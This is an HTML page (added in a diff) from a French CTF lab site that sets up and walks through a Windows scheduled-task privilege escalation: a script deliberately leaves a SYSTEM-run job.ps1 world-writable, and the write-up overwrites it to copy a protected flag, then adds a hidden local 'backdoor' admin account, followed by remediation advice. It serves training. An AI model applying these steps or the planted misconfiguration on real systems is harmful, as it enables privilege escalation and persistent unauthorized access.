@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>Flag 2 — Tâche planifiée élevée - CryptAbyss 2026</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Flag 2 \u2014 T\u00e2che planifi\u00e9e \u00e9lev\u00e9e";
+        var mkdocs_page_input_path = "windows/Flag 2 \u2014 T\u00e2che planifi\u00e9e \u00e9lev\u00e9e.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> CryptAbyss 2026
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Accueil</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Forensic</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier1-magic-bytes/">Tier 1 — Magic Bytes</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier2-file-carving/">Tier 2 — File Carving</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier3-memory-dump/">Tier 3 — Memory Dump</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier4-disk-registre/">Tier 4 — Disk + Registre</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Crypto</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/challenge1/">Challenge 1 - Base64</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/challenge2/">Challenge 2 - Multi-layer Caesar</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">CryptAbyss 2026</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" aria-label="Docs"></a></li>
+      <li class="breadcrumb-item active">Flag 2 — Tâche planifiée élevée</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <blockquote>
+<p><strong>Technique :</strong> Scheduled Task Privilege Escalation
+<strong>Machine de déploiement :</strong> WS01
+<strong>Machine d'exploitation :</strong> WS01
+<strong>Compte de départ :</strong> <code>CTF\lowpriv</code> / <code>User@1234</code>
+<strong>Difficulté :</strong> Facile / Intermédiaire</p>
+</blockquote>
+<hr />
+<h2 id="deploiement">Déploiement</h2>
+<h3 id="script-flag2-tache-planifieeps1">Script — Flag2-Tache-Planifiee.ps1</h3>
+<blockquote>
+<p>[!warning] Lancer en PowerShell Admin sur WS01</p>
+</blockquote>
+<pre><code class="language-powershell">#Requires -RunAsAdministrator
+
+Write-Host &quot;`n[FLAG 2] Tache planifiee elevee modifiable&quot; -ForegroundColor Cyan
+
+# --- 1. Flag stocké dans un fichier lisible UNIQUEMENT par SYSTEM + Admins ---
+$flagDir    = &quot;C:\Windows\System32\CTF&quot;
+$flagSource = &quot;$flagDir\secret.txt&quot;
+New-Item -ItemType Directory -Path $flagDir -Force | Out-Null
+Set-Content $flagSource -Value &quot;FLAG{scheduled_task_priv_esc}&quot; -Encoding UTF8
+
+$aclFlag = Get-Acl $flagSource
+$aclFlag.SetAccessRuleProtection($true, $false)
+$aclFlag.Access | ForEach-Object { $aclFlag.RemoveAccessRule($_) | Out-Null }
+foreach ($sid in @(&quot;S-1-5-18&quot;, &quot;S-1-5-32-544&quot;)) {
+    $s = New-Object System.Security.Principal.SecurityIdentifier($sid)
+    $aclFlag.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
+        $s, &quot;FullControl&quot;, &quot;None&quot;, &quot;None&quot;, &quot;Allow&quot;)))
+}
+Set-Acl -Path $flagSource -AclObject $aclFlag
+Write-Host &quot;  [+] Flag stocke dans $flagSource (SYSTEM + Admins uniquement)&quot; -ForegroundColor Green
+
+# --- 2. Dossier CTF modifiable par tout le monde ---
+$ctfDir = &quot;C:\ProgramData\CTF&quot;
+New-Item -ItemType Directory -Path $ctfDir -Force | Out-Null
+
+$acl         = Get-Acl $ctfDir
+$everyoneSID = New-Object System.Security.Principal.SecurityIdentifier(&quot;S-1-1-0&quot;)
+$rule        = New-Object System.Security.AccessControl.FileSystemAccessRule(
+    $everyoneSID, &quot;Modify&quot;, &quot;ContainerInherit,ObjectInherit&quot;, &quot;None&quot;, &quot;Allow&quot;)
+$acl.AddAccessRule($rule)
+Set-Acl -Path $ctfDir -AclObject $acl
+Write-Host &quot;  [+] $ctfDir cree (Modify pour Tout le monde)&quot; -ForegroundColor Green
+
+# --- 3. job.ps1 neutre — ne contient pas le flag ---
+$jobScript = &quot;$ctfDir\job.ps1&quot;
+@&quot;
+# Tache de maintenance systeme - executee par SYSTEM toutes les 3 minutes
+# Ce fichier est modifiable par les utilisateurs standards
+# Modifiez ce script pour executer des commandes en tant que SYSTEM
+Write-EventLog -LogName Application -Source &quot;Application&quot; -EventId 1000 ``
+    -EntryType Information -Message &quot;HighTask running&quot; -ErrorAction SilentlyContinue
+&quot;@ | Set-Content -Path $jobScript -Encoding UTF8
+Write-Host &quot;  [+] Script cible cree (neutre) : $jobScript&quot; -ForegroundColor Green
+
+# --- 4. Vérifications ---
+Write-Host &quot;`n  Permissions sur $flagSource :&quot; -ForegroundColor Gray
+icacls $flagSource
+Write-Host &quot;`n  Permissions sur $jobScript :&quot; -ForegroundColor Gray
+icacls $jobScript
+
+Write-Host &quot;`n[FLAG 2] Script termine - Creer la tache manuellement (voir guide)&quot; -ForegroundColor Green
+Write-Host &quot;  SNAPSHOT apres creation de la tache : WS01 - Flag2 deploye&quot; -ForegroundColor Yellow
+</code></pre>
+<hr />
+<h3 id="creation-manuelle-de-la-tache-dans-le-planificateur">Création manuelle de la tâche dans le Planificateur</h3>
+<blockquote>
+<p>[!warning] À faire sur WS01 en compte Admin, APRÈS avoir lancé le script</p>
+</blockquote>
+<p>Ouvrir le Planificateur de tâches :</p>
+<pre><code>Win + R → taskschd.msc → Entrée
+</code></pre>
+<p>Cliquer <strong>Action → Créer une tâche</strong> (pas "Créer une tâche de base")</p>
+<h4 id="onglet-general">Onglet Général</h4>
+<table>
+<thead>
+<tr>
+<th>Champ</th>
+<th>Valeur</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Nom</td>
+<td><code>HighTask</code></td>
+</tr>
+<tr>
+<td>Description</td>
+<td><code>Tache de maintenance systeme CTF</code></td>
+</tr>
+<tr>
+<td>Exécuter en tant que</td>
+<td>Cliquer <strong>Changer d'utilisateur</strong> → taper <code>Système</code> → OK</td>
+</tr>
+<tr>
+<td>Exécuter avec les privilèges les plus élevés</td>
+<td>✅ Coché</td>
+</tr>
+<tr>
+<td>Configurer pour</td>
+<td><code>Windows 10</code></td>
+</tr>
+</tbody>
+</table>
+<h4 id="onglet-declencheurs">Onglet Déclencheurs</h4>
+<p>Cliquer <strong>Nouveau</strong> :</p>
+<table>
+<thead>
+<tr>
+<th>Champ</th>
+<th>Valeur</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Commencer la tâche</td>
+<td><code>A l'heure programmée</code></td>
+</tr>
+<tr>
+<td>Paramètres</td>
+<td><code>Une fois</code></td>
+</tr>
+<tr>
+<td>Répéter la tâche toutes les</td>
+<td><code>5 minutes</code></td>
+</tr>
+<tr>
+<td>Pour une durée de</td>
+<td><code>Indéfiniment</code></td>
+</tr>
+<tr>
+<td>Activé</td>
+<td>✅ Coché</td>
+</tr>
+</tbody>
+</table>
+<h4 id="onglet-actions">Onglet Actions</h4>
+<p>Cliquer <strong>Nouveau</strong> :</p>
+<table>
+<thead>
+<tr>
+<th>Champ</th>
+<th>Valeur</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Action</td>
+<td><code>Démarrer un programme</code></td>
+</tr>
+<tr>
+<td>Programme</td>
+<td><code>powershell.exe</code></td>
+</tr>
+<tr>
+<td>Arguments</td>
+<td><code>-NonInteractive -ExecutionPolicy Bypass -File "C:\ProgramData\CTF\job.ps1"</code></td>
+</tr>
+</tbody>
+</table>
+<h4 id="onglet-conditions">Onglet Conditions</h4>
+<ul>
+<li>Décocher <strong>Démarrer la tâche uniquement si l'ordinateur est sur secteur</strong></li>
+<li>Décocher tout le reste</li>
+</ul>
+<h4 id="onglet-parametres">Onglet Paramètres</h4>
+<ul>
+<li>Cocher <strong>Exécuter la tâche dès que possible si un démarrage planifié est manqué</strong></li>
+<li>Décocher <strong>Arrêter la tâche si elle s'exécute depuis plus de</strong></li>
+<li>Si la tâche est déjà en cours d'exécution : <code>Ne pas démarrer une nouvelle instance</code></li>
+</ul>
+<p>Cliquer <strong>OK</strong> — laisser le mot de passe vide si demandé.</p>
+<h4 id="verification-depuis-lowpriv-apres-creation">Vérification depuis lowpriv après création</h4>
+<pre><code class="language-powershell">schtasks /query /tn &quot;HighTask&quot; /fo LIST /v
+</code></pre>
+<p><strong>Résultat attendu :</strong></p>
+<pre><code>Nom de la tâche:     \HighTask
+Statut de la tâche:  Prêt
+Exécuter en tant que: SYSTEM
+Niveau d'élévation:  Highest
+Tâche à exécuter:    powershell.exe -NonInteractive -ExecutionPolicy Bypass
+                     -File &quot;C:\ProgramData\CTF\job.ps1&quot;
+</code></pre>
+<blockquote>
+<p>[!success] Snapshot WS01
+<strong><code>WS01 — Flag2 déployé</code></strong></p>
+</blockquote>
+<hr />
+<h2 id="write-up">Write-up</h2>
+<h3 id="contexte">Contexte</h3>
+<p>Une tâche planifiée Windows s'exécute toutes les 3 minutes en tant que <code>SYSTEM</code> avec le niveau d'exécution <code>Highest</code>. Elle appelle un script PowerShell stocké dans un dossier dont les permissions sont mal configurées. Le flag est stocké dans <code>C:\Windows\System32\CTF\secret.txt</code>, lisible uniquement par <code>SYSTEM</code>. L'objectif est de modifier le script pour que <code>SYSTEM</code> exfiltre le flag à notre place.</p>
+<hr />
+<h3 id="reconnaissance">Reconnaissance</h3>
+<h4 id="etape-1-lister-les-taches-planifiees">Étape 1 — Lister les tâches planifiées</h4>
+<p>Connecté en <code>CTF\lowpriv</code> sur WS01 :</p>
+<pre><code class="language-powershell">schtasks /query /fo TABLE
+</code></pre>
+<p>Dans la liste, on repère <code>HighTask</code>. Pour obtenir ses détails :</p>
+<pre><code class="language-powershell">schtasks /query /tn &quot;HighTask&quot; /fo LIST /v
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>Nom de la tâche:     \HighTask
+Statut de la tâche:  Prêt
+Exécuter en tant que: SYSTEM
+Niveau d'élévation:  Highest
+Tâche à exécuter:    powershell.exe -NonInteractive -ExecutionPolicy Bypass
+                     -File &quot;C:\ProgramData\CTF\job.ps1&quot;
+</code></pre>
+<p>La tâche exécute <code>C:\ProgramData\CTF\job.ps1</code> en tant que <code>SYSTEM</code> toutes les 3 minutes.</p>
+<h4 id="etape-2-inspecter-le-script">Étape 2 — Inspecter le script</h4>
+<pre><code class="language-powershell">Get-Content C:\ProgramData\CTF\job.ps1
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code class="language-powershell"># Tache de maintenance systeme - executee par SYSTEM toutes les 3 minutes
+# Ce fichier est modifiable par les utilisateurs standards
+# Modifiez ce script pour executer des commandes en tant que SYSTEM
+Write-EventLog -LogName Application -Source &quot;Application&quot; -EventId 1000 `
+    -EntryType Information -Message &quot;HighTask running&quot; -ErrorAction SilentlyContinue
+</code></pre>
+<p>Le commentaire confirme que le fichier est modifiable par les utilisateurs standards.</p>
+<h4 id="etape-3-verifier-les-permissions">Étape 3 — Vérifier les permissions</h4>
+<pre><code class="language-powershell">icacls C:\ProgramData\CTF\job.ps1
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>C:\ProgramData\CTF\job.ps1
+  Tout le monde:(I)(M)
+  AUTORITE NT\Système:(I)(F)
+  BUILTIN\Administrateurs:(I)(F)
+  BUILTIN\Utilisateurs:(I)(RX)
+</code></pre>
+<p><code>Tout le monde:(M)</code> — <code>lowpriv</code> peut modifier ce fichier.</p>
+<h4 id="etape-4-confirmer-que-le-flag-est-inaccessible-directement">Étape 4 — Confirmer que le flag est inaccessible directement</h4>
+<pre><code class="language-powershell">Get-Content C:\Windows\System32\CTF\secret.txt
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>Get-Content : Accès au chemin d'accès 'C:\Windows\System32\CTF\secret.txt' est refusé.
+</code></pre>
+<p>Le flag est protégé. Il faut passer par <code>SYSTEM</code> pour le lire.</p>
+<hr />
+<h3 id="exploitation">Exploitation</h3>
+<h4 id="etape-5-modifier-jobps1">Étape 5 — Modifier job.ps1</h4>
+<p>On remplace le contenu de <code>job.ps1</code> par une commande qui copie le flag vers un emplacement accessible :</p>
+<pre><code class="language-powershell">@&quot;
+Copy-Item C:\Windows\System32\CTF\secret.txt C:\Users\Public\flag2.txt -Force
+&quot;@ | Set-Content C:\ProgramData\CTF\job.ps1 -Encoding UTF8
+</code></pre>
+<p>Vérifier la modification :</p>
+<pre><code class="language-powershell">Get-Content C:\ProgramData\CTF\job.ps1
+# Attendu : Copy-Item C:\Windows\System32\CTF\secret.txt C:\Users\Public\flag2.txt -Force
+</code></pre>
+<h4 id="etape-6-attendre-lexecution-par-system">Étape 6 — Attendre l'exécution par SYSTEM</h4>
+<pre><code class="language-powershell">while (-not (Test-Path C:\Users\Public\flag2.txt)) {
+    Write-Host &quot;En attente de l execution par SYSTEM...&quot;
+    Start-Sleep -Seconds 15
+}
+Write-Host &quot;Flag disponible !&quot; -ForegroundColor Green
+</code></pre>
+<hr />
+<h3 id="recuperation-du-flag">Récupération du flag</h3>
+<pre><code class="language-powershell">Get-Content C:\Users\Public\flag2.txt
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>FLAG{scheduled_task_priv_esc}
+</code></pre>
+<hr />
+<h3 id="aller-plus-loin-persistance">Aller plus loin — Persistance</h3>
+<pre><code class="language-powershell">@&quot;
+net user backdoor P@ssBack1 /add
+net localgroup Administrateurs backdoor /add
+&quot;@ | Set-Content C:\ProgramData\CTF\job.ps1 -Encoding UTF8
+</code></pre>
+<p>Après 3 minutes, le compte <code>backdoor</code> est créé avec les droits admin locaux sur WS01.</p>
+<hr />
+<h3 id="remediation">Remédiation</h3>
+<table>
+<thead>
+<tr>
+<th>Problème</th>
+<th>Correction</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Script SYSTEM modifiable par tous</td>
+<td><code>icacls C:\ProgramData\CTF\job.ps1 /inheritance:r /grant:r "AUTORITE NT\Système:(F)" "BUILTIN\Administrateurs:(F)"</code></td>
+</tr>
+<tr>
+<td>Dossier world-writable</td>
+<td>Stocker les scripts dans des chemins protégés avec ACL strictes</td>
+</tr>
+<tr>
+<td>RunLevel Highest inutile</td>
+<td>Utiliser un compte de service dédié avec le minimum de droits</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="resume-de-la-chaine-dexploitation">Résumé de la chaîne d'exploitation</h3>
+<pre><code>lowpriv
+  └─→ schtasks /query → repère HighTask (SYSTEM, Highest, toutes les 3 min)
+        └─→ tâche à exécuter → C:\ProgramData\CTF\job.ps1
+              └─→ icacls → Tout le monde:(M) → modifiable
+                    └─→ secret.txt → Accès refusé → nécessite SYSTEM
+                          └─→ Set-Content job.ps1 → Copy-Item secret.txt
+                                └─→ attendre 3 min → SYSTEM exécute
+                                      └─→ FLAG{scheduled_task_priv_esc}
+</code></pre>
+              
+            </div>
+          </div><footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+    
+  </span>
+</div>
+    <script src="../../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "../..";</script>
+    <script src="../../js/theme_extra.js"></script>
+    <script src="../../js/theme.js"></script>
+      <script src="../../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
